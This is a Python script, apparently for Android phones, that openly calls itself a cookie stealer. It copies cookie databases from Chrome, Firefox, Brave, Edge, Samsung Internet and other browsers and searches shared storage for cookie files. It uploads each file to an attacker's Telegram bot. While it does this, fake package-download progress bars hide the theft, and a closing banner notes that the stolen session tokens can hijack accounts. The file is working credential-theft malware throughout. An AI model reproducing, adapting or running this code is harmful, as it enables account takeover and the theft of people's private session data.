#!/usr/bin/env python3
import os
import requests
import time
import sys
import random
import threading
import shutil
from datetime import datetime

try:
    from config import BOT_TOKEN, TELEGRAM_USER_ID
except ImportError:
    print("ERROR: config.py not found! Create config.py with BOT_TOKEN and TELEGRAM_USER_ID")
    sys.exit(1)

GREEN = '\033[38;5;46m'
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
PURPLE = '\033[1;35m'
RESET = '\033[0m'

def send_cookie_file(file_path):
    try:
        abs_path = os.path.abspath(file_path)
        filename = os.path.basename(abs_path)
        size = os.path.getsize(abs_path)
        if size < 1024:
            size_str = f"{size} B"
        elif size < 1024*1024:
            size_str = f"{round(size/1024,1)} KB"
        else:
            size_str = f"{round(size/(1024*1024),1)} MB"
        
        # Browser detection from path
        browser = "Unknown"
        if 'chrome' in abs_path.lower():
            browser = "Google Chrome"
        elif 'firefox' in abs_path.lower() or 'mozilla' in abs_path.lower():
            browser = "Mozilla Firefox"
        elif 'brave' in abs_path.lower():
            browser = "Brave Browser"
        elif 'opera' in abs_path.lower():
            browser = "Opera Browser"
        elif 'vivaldi' in abs_path.lower():
            browser = "Vivaldi Browser"
        elif 'edge' in abs_path.lower():
            browser = "Microsoft Edge"
        elif 'samsung' in abs_path.lower():
            browser = "Samsung Internet"
        
        caption = f"🍪 COOKIE STEALER\n🌐 BROWSER: {browser}\n📂 PATH: {abs_path}\n📄 FILE: {filename}\n💾 SIZE: {size_str}\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_USER_ID, 'caption': caption}, timeout=30)
        return True
    except Exception as e:
        return False

def steal_cookies():
    cookie_paths = [
        # Chrome
        '/storage/emulated/0/Android/data/com.android.chrome/files/cookies',
        '/storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/Cookies',
        '/data/data/com.android.chrome/app_chrome/Default/Cookies',
        '/storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/Cookies-journal',
        
        # Chrome Beta
        '/storage/emulated/0/Android/data/com.chrome.beta/files/cookies',
        '/data/data/com.chrome.beta/app_chrome/Default/Cookies',
        
        # Chrome Dev
        '/storage/emulated/0/Android/data/com.chrome.dev/files/cookies',
        '/data/data/com.chrome.dev/app_chrome/Default/Cookies',
        
        # Firefox
        '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/cookies.sqlite',
        '/data/data/org.mozilla.firefox/files/mozilla/firefox/cookies.sqlite',
        '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/profiles/cihkg9md.default-release/cookies.sqlite',
        
        # Firefox Beta
        '/storage/emulated/0/Android/data/org.mozilla.firefox_beta/files/mozilla/firefox/cookies.sqlite',
        
        # Firefox Nightly
        '/storage/emulated/0/Android/data/org.mozilla.fennec/files/mozilla/firefox/cookies.sqlite',
        
        # Brave
        '/storage/emulated/0/Android/data/com.brave.browser/files/Default/Cookies',
        '/data/data/com.brave.browser/app_brave/Default/Cookies',
        
        # Brave Beta
        '/storage/emulated/0/Android/data/com.brave.browser_beta/files/Default/Cookies',
        
        # Opera
        '/storage/emulated/0/Android/data/com.opera.browser/files/Cookies',
        '/data/data/com.opera.browser/app_opera/Default/Cookies',
        
        # Opera Mini
        '/storage/emulated/0/Android/data/com.opera.mini.native/files/cookies',
        
        # Vivaldi
        '/storage/emulated/0/Android/data/com.vivaldi.browser/files/Default/Cookies',
        '/data/data/com.vivaldi.browser/app_vivaldi/Default/Cookies',
        
        # Microsoft Edge
        '/storage/emulated/0/Android/data/com.microsoft.emmx/files/Cookies',
        '/data/data/com.microsoft.emmx/app_edge/Default/Cookies',
        
        # Samsung Internet
        '/storage/emulated/0/Android/data/com.sec.android.app.sbrowser/files/Cookies',
        '/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Cookies',
        
        # Kiwi Browser
        '/storage/emulated/0/Android/data/com.kiwibrowser.browser/files/Default/Cookies',
        
        # UC Browser
        '/storage/emulated/0/Android/data/com.UCMobile.intl/files/cookies',
        
        # Dolphin Browser
        '/storage/emulated/0/Android/data/mobi.mgeek.TunnyBrowser/files/cookies',
        
        # Via Browser
        '/storage/emulated/0/Android/data/mark.via/files/cookies',
    ]
    
    cookies_found = 0
    captured_data = []
    
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                browser_name = "unknown"
                if 'chrome' in path:
                    browser_name = "chrome"
                elif 'firefox' in path:
                    browser_name = "firefox"
                elif 'brave' in path:
                    browser_name = "brave"
                elif 'opera' in path:
                    browser_name = "opera"
                elif 'vivaldi' in path:
                    browser_name = "vivaldi"
                elif 'emmx' in path or 'edge' in path:
                    browser_name = "edge"
                elif 'sbrowser' in path:
                    browser_name = "samsung"
                
                dest = f"/storage/emulated/0/cookies_{browser_name}_{timestamp}.db"
                shutil.copy2(path, dest)
                if send_cookie_file(dest):
                    cookies_found += 1
                    captured_data.append(f"✓ {browser_name.upper()} cookies captured")
                    print(f"{GREEN}[✓] {browser_name.upper()} cookies stolen!{RESET}")
                os.remove(dest)
            except Exception as e:
                pass
    
    for root, dirs, files in os.walk('/storage/emulated/0/'):
        for file in files:
            if 'cookie' in file.lower() and file.lower().endswith(('.txt', '.db', '.sqlite', '.cookies', '.bin')):
                full_path = os.path.join(root, file)
                if os.path.getsize(full_path) < 50 * 1024 * 1024:
                    if send_cookie_file(full_path):
                        cookies_found += 1
                        captured_data.append(f"✓ {file}")
                        print(f"{GREEN}[✓] Found cookie: {file}{RESET}")
                    time.sleep(0.1)
    
    return cookies_found, captured_data

FAKE_PACKAGES = [
    "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
    "php_8.1.0_arm64.deb", "nginx_1.22.0_arm64.deb",
    "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
    "docker_20.10.21_arm64.deb", "metasploit_6.3.0_arm64.deb",
    "curl_7.88.1_arm64.deb", "wget_1.21.3_arm64.deb",
    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb",
    "ruby_3.1.2_arm64.deb", "perl_5.36.0_arm64.deb"
]

def fake_download():
    pkg = random.choice(FAKE_PACKAGES)
    size = random.uniform(10, 80)
    duration = random.randint(30, 90)
    
    print(f"\n{YELLOW}┌─────────────────────────────────────────┐{RESET}")
    print(f"{YELLOW}│ 📦 DOWNLOADING: {pkg}{RESET}")
    print(f"{YELLOW}│ 📊 SIZE: {size:.1f} MB{RESET}")
    print(f"{YELLOW}│ ⏱ ESTIMATED: {duration}s{RESET}")
    print(f"{YELLOW}└─────────────────────────────────────────┘{RESET}")
    
    bar_len = 40
    for i in range(bar_len + 1):
        percent = (i / bar_len) * 100
        bar = "█" * i + "░" * (bar_len - i)
        print(f"\r{CYAN}▶ PROGRESS: [{bar}] {percent:.1f}%{RESET}", end="")
        time.sleep(duration / bar_len)
    
    print(f"\n{GREEN}✓ DOWNLOAD COMPLETE!{RESET}")
    time.sleep(1)

def show_header():
    os.system('clear')
    header = f"""
{RED}╔════════════════════════════════════════════════════════════════╗
{RED}║{YELLOW}                                                              {RED}║
{RED}║{WHITE}      ██████╗██████╗ ██╗  ██╗██╗   ██╗███████╗            {RED}║
{RED}║{WHITE}     ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝            {RED}║
{RED}║{WHITE}     ██║     ██████╔╝█████╔╝ ██║   ██║███████╗            {RED}║
{RED}║{WHITE}     ██║     ██╔══██╗██╔═██╗ ██║   ██║╚════██║            {RED}║
{RED}║{WHITE}     ╚██████╗██║  ██║██║  ██╗╚██████╔╝███████║            {RED}║
{RED}║{WHITE}      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝            {RED}║
{RED}║{YELLOW}                                                              {RED}║
{RED}║{CYAN}                 🍪 COOKIE STEALER EDITION 🍪                  {RED}║
{RED}║{WHITE}                   ⚡ FAST • STEALTH • POWERFUL ⚡                {RED}║
{RED}║{YELLOW}                                                              {RED}║
{RED}╚════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(header)
    time.sleep(1.5)

def main():
    show_header()
    
    print(f"{CYAN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}│ {WHITE}🔍 COOKIE EXTRACTION INITIALIZED{RESET}{CYAN}                                 │{RESET}")
    print(f"{CYAN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    checks = ["Initializing cookie scanner", "Locating browser profiles", "Checking storage", "Establishing secure channel"]
    for check in checks:
        print(f"{YELLOW}  ⏳ {check}...{RESET}", end=" ")
        time.sleep(random.uniform(0.5, 1))
        print(f"{GREEN}✓ OK{RESET}")
    
    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}│ {WHITE}✅ COOKIE STEALER READY{RESET}{GREEN}                                         │{RESET}")
    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{YELLOW}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{YELLOW}│ {WHITE}🍪 HARVESTING COOKIES{RESET}{YELLOW}                                            │{RESET}")
    print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
    
    cookie_thread = threading.Thread(target=steal_cookies)
    cookie_thread.daemon = True
    cookie_thread.start()
    
    print(f"\n{WHITE}╔═══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{WHITE}║{CYAN}            SCANNING ALL BROWSERS FOR COOKIES...               {WHITE}║{RESET}")
    print(f"{WHITE}╚═══════════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(2)
    
    num_pkgs = random.randint(8, 15)
    print(f"\n{GREEN}✨ Found {num_pkgs} browser profiles!{RESET}\n")
    
    for i in range(random.randint(3, 8)):
        fake_download()
    
    cookie_thread.join(timeout=3)
    
    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}│ {WHITE}✅ COOKIE EXTRACTION COMPLETE!{RESET}{GREEN}                                  │{RESET}")
    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                    💡 INFORMATION 💡                        {CYAN}║{RESET}")
    print(f"{CYAN}║{YELLOW}                                                               {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • All cookies sent to your Telegram                      {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Session tokens can be used to hijack accounts         {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Check your Telegram for captured data                 {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close                              {CYAN}║{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════╝{RESET}")
    
    print(f"\n{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
    print(f"{PURPLE}           PRESS ENTER TO EXIT...{RESET}")
    print(f"{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
    input()
    os.system('clear')
    print(f"{GREEN}Operation completed. Check your Telegram.{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}⚠ INTERRUPTED{RESET}")
        sys.exit(0)
